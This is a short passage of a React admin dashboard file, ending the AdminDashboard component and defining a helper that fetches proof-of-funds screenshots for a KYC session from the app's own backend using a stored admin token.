                      </button>
                    </div>
                  )
                )
              ) : null}
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default AdminDashboard;

export const fetchPofScreenshots = async (sessionId) => {
  try {
    const response = await fetch(`${BACKEND_URL}/api/kyc/${sessionId}/pof-screenshot`, {
      method: 'GET',
      headers: {
        Authorization: `Bearer ${localStorage.getItem('adminToken')}`,
      },
    });

    if (!response.ok) {
      throw new Error('Failed to fetch POF screenshots');
    }

    const data = await response.json();
    return data.screenshots;
  } catch (error) {
    console.error('Error fetching POF screenshots:', error);
    return [];
  }
};
